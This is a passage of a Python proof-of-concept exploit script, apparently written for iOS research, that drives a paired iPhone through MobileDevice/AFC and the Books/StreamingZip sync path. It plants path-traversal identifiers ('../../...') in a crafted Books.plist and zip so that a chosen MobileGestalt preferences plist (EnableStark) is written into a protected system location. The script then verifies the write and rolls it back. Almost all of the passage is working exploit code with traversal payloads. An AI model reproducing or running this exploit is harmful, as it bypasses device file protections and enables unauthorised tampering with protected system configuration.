) -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(6)
    source = f"codex-mg-src-{EXPECTED_BUILD}-{token}"
    link_dest = f"codex-mg-link-{EXPECTED_BUILD}-{token}"
    recovered = f"codex-mg-recovered-{EXPECTED_BUILD}-{token}"
    link_identifier = f"../../{source}/pivot/link"
    payload_identifier = f"../../{source}/payload"
    rollback_identifier = f"../../../Library/Preferences/{MG_PLIST_LEAF}"
    payload_dest = f"{link_dest}/{MG_PLIST_LEAF}"
    chosen_plist_bytes = mobilegestalt_plist_bytes(chosen_value)
    archive = build_preferences_archive(chosen_plist_bytes)
    books_plist = build_books_plist(
        link_identifier, payload_identifier, rollback_identifier
    )
    result: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipMobileGestaltSourceWriteFreshObservationRollback",
        "scope": "/var/mobile/Library/Preferences/com.apple.MobileGestalt.plist",
        "mobileGestaltTouched": False,
        "canonicalCacheTouched": False,
        "chosenKey": "EnableStark",
        "chosenBooleanValue": chosen_value,
        "chosenPlistLength": len(chosen_plist_bytes),
        "chosenPlistSHA256": hashlib.sha256(chosen_plist_bytes).hexdigest(),
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksInputSHA256": hashlib.sha256(books_plist).hexdigest(),
        "source": source,
        "linkDestination": link_dest,
        "recovered": recovered,
        "preferenceLeaf": MG_PLIST_LEAF,
        "transport": {
            "path": "MobileDevice RemoteXPC paired-device service",
            "existingPairing": True,
            "autopair": False,
        },
    }
    atc_task: asyncio.Task | None = None
    gate_path: Path | None = None
    stage_succeeded = False
    try:
        udid = TRANSPORT.paired_coredevice_udid()
        pre_probe = await asyncio.to_thread(run_source_probe, udid)
        result["freshProcessPreimage"] = pre_probe
        result["sourcePreimageAbsent"] = mg_source_absent(pre_probe)
        if not result["sourcePreimageAbsent"]:
            raise RuntimeError("MobileGestalt source preimage is not proven absent")

        native_preflight = await asyncio.to_thread(
            run_mobiledevice_io, "probe-afc", udid
        )
        result["nativePreflight"] = native_preflight
        if not (
            native_preflight.get("targetGatePassed")
            and native_preflight.get("operation", {}).get("ok")
            and not native_preflight.get("operation", {}).get(
                "booksSyncPlistPresent"
            )
        ):
            raise RuntimeError("MobileDevice/AFC preflight failed")

        with tempfile.TemporaryDirectory(prefix="atc-mg-native-") as work_dir:
            work_path = Path(work_dir)
            archive_path = work_path / "payload.zip"
            books_path = work_path / "Books.plist"
            expected_path = work_path / "expected.plist"
            archive_path.write_bytes(archive)
            books_path.write_bytes(books_plist)
            expected_path.write_bytes(chosen_plist_bytes)

            stage = await asyncio.to_thread(
                run_mobiledevice_io,
                "stage",
                udid,
                source,
                link_dest,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
            )
            result["nativeStage"] = stage
            stage_succeeded = bool(
                stage.get("targetGatePassed")
                and stage.get("operation", {}).get("ok")
            )
            if not stage_succeeded:
                raise RuntimeError("native StreamingZip/Books staging failed")

            gate_path = work_path / "continue"
            ready_path = Path(f"{gate_path}.ready")
            result["mobileGestaltTouched"] = True
            atc_task = asyncio.create_task(
                asyncio.to_thread(
                    run_atc_host,
                    udid,
                    link_identifier,
                    link_dest,
                    payload_identifier,
                    payload_dest,
                    rollback_identifier,
                    recovered,
                    os.fspath(gate_path),
                )
            )
            try:
                for _ in range(750):
                    if ready_path.exists() or atc_task.done():
                        break
                    await asyncio.sleep(0.1)
                result["payloadCompletionGateReady"] = ready_path.exists()
                if result["payloadCompletionGateReady"]:
                    observation = await asyncio.to_thread(run_source_probe, udid)
                    result["freshProcessWhilePresent"] = observation
                    result["freshProcessObservedProtectedPresence"] = (
                        mg_source_observed_protected_presence(observation)
                    )
                    result["chosenValueObserved"] = mg_source_observed_true(
                        observation
                    )
                else:
                    result["freshProcessObservedProtectedPresence"] = False
                    result["chosenValueObserved"] = False
            finally:
                gate_path.touch(exist_ok=True)
                result["atc"] = await atc_task

            native_cleanup = await asyncio.to_thread(
                run_mobiledevice_io,
                "verify-cleanup",
                udid,
                source,
                link_dest,
                recovered,
                os.fspath(expected_path),
            )
            result["nativeVerifyCleanup"] = native_cleanup

        post_probe = await asyncio.to_thread(run_source_probe, udid)
        result["freshProcessAfterRollback"] = post_probe
        result["sourceRestoredAbsent"] = mg_source_absent(post_probe)
    except Exception as error:
        result["errorType"] = type(error).__name__
        result["error"] = TRANSPORT.redact(error)
        if gate_path is not None:
            gate_path.touch(exist_ok=True)
        if atc_task is not None and not atc_task.done():
            with suppress(Exception):
                result["atc"] = await atc_task
    finally:
        if stage_succeeded and "nativeVerifyCleanup" not in result:
            with tempfile.TemporaryDirectory(prefix="atc-mg-cleanup-") as clean_dir:
                expected_path = Path(clean_dir) / "expected.plist"
                expected_path.write_bytes(chosen_plist_bytes)
                with suppress(Exception):
                    udid = TRANSPORT.paired_coredevice_udid()
                    result["nativeVerifyCleanup"] = await asyncio.to_thread(
                        run_mobiledevice_io,
                        "verify-cleanup",
                        udid,
                        source,
                        link_dest,
                        recovered,
                        os.fspath(expected_path),
                    )
        if result.get("mobileGestaltTouched") and "freshProcessAfterRollback" not in result:
            with suppress(Exception):
                udid = TRANSPORT.paired_coredevice_udid()
                post_probe = await asyncio.to_thread(run_source_probe, udid)
                result["freshProcessAfterRollback"] = post_probe
                result["sourceRestoredAbsent"] = mg_source_absent(post_probe)

    atc = result.get("atc", {})
    cleanup = result.get("nativeVerifyCleanup", {}).get("operation", {})
    result["freshHostRecoveredChosenBytes"] = bool(
        cleanup.get("recoveredPresent")
        and cleanup.get("recoveredBytesMatch")
        and cleanup.get("observedLength") == len(chosen_plist_bytes)
    )
    result["freshHostReadBackChosenValue"] = bool(
        cleanup.get("recoveredRootIsDictionary")
        and cleanup.get("recoveredKeyCount") == 1
        and cleanup.get("recoveredEnableStark") is chosen_value
        and cleanup.get("recoveredPlistParseError") is None
    )
    result["chosenWriteProven"] = bool(
        result.get("sourcePreimageAbsent")
        and result.get("freshProcessObservedProtectedPresence")
        and result.get("freshHostRecoveredChosenBytes")
        and result.get("freshHostReadBackChosenValue")
    )
    success = bool(
        result.get("sourcePreimageAbsent")
        and result.get("payloadCompletionGateReady")
        and result.get("chosenWriteProven")
        and atc.get("ok")
        and atc.get("gatedRollback")
        and not atc.get("gateTimedOut")
        and cleanup.get("recoveredPresent")
        and cleanup.get("recoveredBytesMatch")
        and cleanup.get("sourceMediaAbsent")
        and cleanup.get("linkAbsent")
        and cleanup.get("recoveredAbsent")
        and cleanup.get("booksFilesAbsent")
        and cleanup.get("cleanupFailureCount") == 0
        and result.get("sourceRestoredAbsent")
    )
    result["exactRollback"] = bool(
        result.get("sourcePreimageAbsent")
        and cleanup.get("recoveredBytesMatch")
        and result.get("sourceRestoredAbsent")
    )
    result["outcome"] = "confirmed" if success else "not-confirmed"
    return (0 if success else 2), result


def dry_run() -> dict[str, Any]:
    source = "codex-atc-src-24A435-dryrun"
    target = "codex-atc-target-24A435-dryrun"
    archive = build_archive(target)
    link_identifier = f"../../{source}/link"
    payload_identifier = f"../../{source}/payload"
    with zipfile.ZipFile(io.BytesIO(archive)) as parsed:
        entries = [
            {
                "name": item.filename,
                "mode": oct((item.external_attr >> 16) & 0xFFFF),
                "size": item.file_size,
            }
            for item in parsed.infolist()
        ]
    return {
        "schema": 1,
        "dryRun": True,
        "scope": "/var/mobile/Media only",
        "mobileGestaltTouched": False,
        "linkIdentifier": link_identifier,
        "payloadIdentifier": payload_identifier,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksInputSHA256": hashlib.sha256(
            build_books_plist(link_identifier, payload_identifier)
        ).hexdigest(),
        "entries": entries,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--preflight", action="store_true")
    group.add_argument("--run", action="store_true")
    group.add_argument("--preferences-run", action="store_true")
    group.add_argument("--mobilegestalt-run", action="store_true")
    group.add_argument("--mobilegestalt-false-run", action="store_true")
    args = parser.parse_args()
    logging.disable(logging.CRITICAL)
    if args.preflight:
        code, result = asyncio.run(preflight())
    elif args.preferences_run:
        code, result = asyncio.run(run_preferences_canary())
    elif args.mobilegestalt_run:
        code, result = asyncio.run(run_mobilegestalt_source_native())
    elif args.mobilegestalt_false_run:
        code, result = asyncio.run(run_mobilegestalt_source_native(False))
    elif args.run:
        code, result = asyncio.run(run_canary())
    else:
        code, result = 0, dry_run()
    print(json.dumps(result, indent=2, sort_keys=True))
    return code


if __name__ == "__main__":
    sys.exit(main())
